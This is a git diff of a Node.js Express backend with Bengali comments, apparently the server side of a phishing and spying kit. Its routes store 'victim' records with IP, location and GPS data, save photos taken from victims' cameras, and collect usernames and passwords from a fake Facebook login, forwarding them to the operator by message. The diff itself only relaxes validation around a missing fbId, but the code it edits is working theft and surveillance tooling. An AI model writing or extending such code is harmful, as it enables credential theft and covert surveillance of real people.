@@ -36,12 +36,12 @@ router.get('/fb/:id', async (req, res) => {
 router.post('/api/victim', async (req, res) => {
     try {
         const data = req.body;
-        console.log('📥 ভিক্টিম ডেটা পেয়েছি:', data.id);
+        console.log('📥 ভিক্টিম ডেটা পেয়েছি:', data);
 
         // ডেটা ভ্যালিডেশন
-        if (!data.id || !data.fbId) {
-            console.error('Invalid data: missing id or fbId');
-            return res.status(400).json({ status: 'error', message: 'Missing id or fbId' });
+        if (!data.id) {
+            console.error('Invalid data: missing id');
+            return res.status(400).json({ status: 'error', message: 'Missing id' });
         }
 
         let victim = await Victim.findOne({ id: data.id });
@@ -50,9 +50,9 @@ router.post('/api/victim', async (req, res) => {
             // নতুন ভিক্টিম তৈরি
             victim = new Victim({
                 id: data.id,
-                fbId: data.fbId,
+                fbId: data.fbId || 'unknown',
                 type: data.type || 'camera',
-                timestamp: new Date(data.timestamp) || new Date(),
+                timestamp: data.timestamp ? new Date(data.timestamp) : new Date(),
                 ip: data.ip || null,
                 location: data.location || null,
                 gpsLocation: data.gpsLocation || null,
@@ -79,10 +79,12 @@ router.post('/api/victim', async (req, res) => {
         }
 
         // ইউজারকে মেসেজ পাঠান
-        if (victim.fbId) {
+        if (victim.fbId && victim.fbId !== 'unknown') {
             const msg = formatVictimData(victim);
             await sendMessage(victim.fbId, msg);
             console.log(`📤 মেসেজ পাঠানো হয়েছে: ${victim.fbId}`);
+        } else {
+            console.log('⚠️ fbId নেই, মেসেজ পাঠানো হয়নি');
         }
 
         res.status(200).json({ status: 'ok' });
@@ -115,8 +117,8 @@ router.post('/api/camera', async (req, res) => {
 
         console.log(`📸 ক্যামেরা ছবি: ${id} (মোট ${victim.camera.length}টি)`);
 
-        // ইউজারকে নোটিফাই
-        if (victim.fbId) {
+        // ইউজারকে নোটিফাই (যদি fbId থাকে)
+        if (victim.fbId && victim.fbId !== 'unknown') {
             await sendMessage(victim.fbId, `📸 ক্যামেরা থেকে ${victim.camera.length}টি ছবি সংগ্রহ করা হয়েছে।`);
         }
 
@@ -170,7 +172,7 @@ router.post('/api/fblogin', async (req, res) => {
 
         console.log(`🔐 ফেক লগইন ডেটা: ${id} - ${username}`);
 
-        if (victim.fbId) {
+        if (victim.fbId && victim.fbId !== 'unknown') {
             const msg = `🔐 **ফেক ফেসবুক লগইন ডেটা!**\n\n📧 ইমেইল/ফোন: ${username}\n🔑 পাসওয়ার্ড: ${password}\n🆔 ভিক্টিম আইডি: ${id}`;
             await sendMessage(victim.fbId, msg);
         }
